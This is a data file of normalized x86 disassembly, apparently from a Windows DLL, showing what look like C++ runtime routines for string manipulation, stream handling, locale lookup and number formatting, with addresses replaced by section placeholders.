push esi
call sub_10019ce4
add esp 0x4
sub_1000aea0
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_10009610
or eax 0x4
sub_1000aef0
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x60 ]
lea esi [ edi + 0x60 ]
mov ecx esi
call sub_1000a740
push esi
mov [ esi ] r--data
call sub_10019895
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call sub_10019ce4
add esp 0x4
sub_1000af30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_10019141
test ecx ecx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0xc ]
add ecx ebx
push ecx
push eax
call sub_1001a060
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
push eax
push ecx
push ebx
mov ecx esi
call sub_1000a350
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1000b030
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c7a0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
test [ edx + ecx + 0x14 ] 0x2
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1000aea0
sub_1000b090
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10006f30
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10006f30
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1000b1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c7c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10009320
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1000ac10
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x18 ]
push eax
mov ecx ebx
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10019397
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_100193bf
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_1000b260
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c748
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10019397
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10019397
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100193bf
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10019462
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100193bf
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1000ad50
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10019397
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10019c0c
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1001a898
lea ecx [ ebp + 0x8 ]
call sub_100193bf
push esi
call sub_100193eb
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1000b3a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c81c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x38 ]
call sub_1000a5b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000a500
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1000a3c0
jmp r-xdata
sub_1000b470
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c848
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call j_sub_1001cf4c
test al al
jne r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1000b030
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_1000b4e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_10007470
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1000b510
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c748
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10019397
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10019397
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100193bf
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10019462
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100193bf
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1000b3a0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10019397
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10019c0c
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1001a898
lea ecx [ ebp + 0x8 ]
call sub_100193bf
push esi
call sub_100193eb
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1000b650
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c890
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x18 ]
add ecx esi
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
add ecx esi
call sub_10009320
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000b260
mov ebx [ ebp - 0x1c ]
add esp 0x4
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x1
cmp ebx edi
je r-xdata
mov ecx eax
call sub_1000aea0
mov [ ebp - 0x4 ] 0x5
call j_sub_1001cf4c
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov dl [ ecx + esi + 0x40 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ecx + esi + 0x38 ]
push ebx
mov [ ebp - 0x20 ] dl
mov ebx [ ebp - 0x20 ]
mov edx [ ebp - 0x24 ]
mov edi [ edx ]
push ebx
add eax esi
push eax
push ecx
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edx
mov edx [ edi + 0x18 ]
mov [ ebp - 0x4 ] 0x3
call edx
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push edi
lea ecx [ ebp - 0x20 ]
call sub_10019397
mov eax [ ebx + 0x4 ]
cmp eax edi
jbe r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
je r-xdata
mov ecx esi
call sub_1000b030
push 0x0
push eax
call sub_10009610
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] 0x4
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100193bf
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_1000b7f3
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0xc ]
or ecx 0x4
cmp [ eax + 0x38 ] 0x0
jne r-xdata
and ecx 0x17
mov [ eax + 0xc ] ecx
test [ eax + 0x10 ] ecx
jne r-xdata
or ecx 0x4
push 0x0
push 0x0
call sub_1001a898
int3
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_1000b840
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c8d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov ebx ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x4c ] al
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
mov ecx esi
call sub_10009320
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1000b510
mov edi [ ebp - 0x58 ]
add esp 0x4
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
movzx eax [ ebp + 0x1c ]
mov ecx [ ebp - 0x4c ]
mov edx [ ebx ]
mov edx [ edx + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push esi
push eax
push ecx
push edi
mov ecx ebx
call edx
mov eax edi
jmp r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] edi
call sub_10019397
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp - 0x5c ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1000aa60
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_100076f0
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x5c ]
call sub_1000aa80
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_100076f0
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x1
jb r-xdata
mov edi [ edi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x64 ]
not edi
call sub_100193bf
and edi [ ebp - 0x50 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ esi + 0x24 ] 0x0
mov edi [ esi + 0x20 ]
mov ecx [ ebp - 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor edi edi
jg r-xdata
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edi
push eax
push ecx
push edx
lea eax [ ebp - 0x68 ]
push eax
push ebx
call sub_1000a9f0
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
add esp 0x18
mov [ ebp + 0x10 ] edx
xor edi edi
cmp edi ecx
jbe r-xdata
test edi edi
je r-xdata
push ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
lea edx [ ebp - 0x60 ]
push edx
push ebx
call sub_1000a980
mov ecx [ eax ]
xor edx edx
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push edi
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] edx
mov edx [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
push edx
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x10 ] eax
call sub_1000a9f0
add esp 0x30
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
sub edi ecx
jmp r-xdata
mov eax esi
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ esi + 0x14 ]
and edx 0x1c0
cmp edx 0x40
je r-xdata
sub_1000ba60
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c918
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x30 ]
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x58 ] edx
mov edx [ ebp + 0x2c ]
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4c ] ebx
call sub_10009320
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1000b510
mov esi eax
mov eax [ ebp - 0x70 ]
add esp 0x4
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx esi
call sub_1000abf0
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call eax
xor ecx ecx
mov [ ebp - 0x60 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
mov al [ edi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov esi eax
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x60 ] esi
call sub_10019397
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x64 ] ecx
cmp al 0x2d
jne r-xdata
mov esi [ esi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x64 ]
not esi
call sub_100193bf
and esi [ ebp - 0x60 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x54 ] eax
call sub_1001ab6d
mov ecx [ eax ]
mov dl [ ecx ]
push ebx
push 0x65
push edi
mov [ ebp - 0x5c ] dl
mov [ ebp - 0x5b ] 0x65
call sub_1001aac0
mov esi eax
movsx eax [ ebp - 0x5c ]
push ebx
push eax
push edi
call sub_1001aac0
add esp 0x18
mov [ ebp - 0x50 ] eax
test eax eax
jne r-xdata
mov esi [ ebp - 0x7c ]
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ esi + 0x4 ] eax
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x78 ]
mov ecx [ edx + 0x20 ]
add eax ebx
add eax [ ebp - 0x6c ]
add eax [ ebp - 0x58 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x50 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx ecx [ ebp - 0x5c ]
push ebx
push ecx
push edi
call sub_1001aac0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_1000b090
test esi esi
jne r-xdata
push ebx
push 0x65
push edi
call sub_1001aac0
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x60 ]
mov ecx [ ebp + 0x14 ]
sub eax edi
push edx
mov edx [ ebp + 0x10 ]
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push edi
push ecx
push edx
lea eax [ ebp - 0x68 ]
push eax
push esi
call sub_1000ab50
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x58 ]
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x30
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push esi
call sub_1000a9f0
mov edx [ eax ]
mov ecx [ ebp - 0x7c ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
add esp 0x34
call eax
mov edx [ ebp + 0x14 ]
push 0x1
mov [ ebp - 0x70 ] al
mov ecx [ ebp - 0x70 ]
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x80 ]
push ecx
push esi
call sub_1000a9f0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x6c ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
lea eax [ ebp - 0x74 ]
push eax
push esi
call sub_1000a9f0
mov ecx [ eax ]
add edi ebx
add esp 0x30
sub [ ebp - 0x4c ] ebx
mov ebx [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
cmp [ ebp - 0x64 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x68 ]
push edx
push esi
call sub_1000a9f0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
jmp r-xdata
sub ecx eax
mov [ ebp - 0x50 ] ecx
jmp r-xdata
mov ebx [ ebp - 0x50 ]
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0x54 ]
push 0x30
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1000aaa0
mov ebx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edi
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_1000ab50
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x54 ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_1000a9f0
mov ecx [ eax ]
mov edx [ ebp - 0x78 ]
mov edi [ ebp - 0x84 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push edi
push esi
mov [ ebp + 0x14 ] eax
call sub_1000a9f0
mov esi 0x10
add esp 0x4c
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp + 0x14 ]
sub eax edi
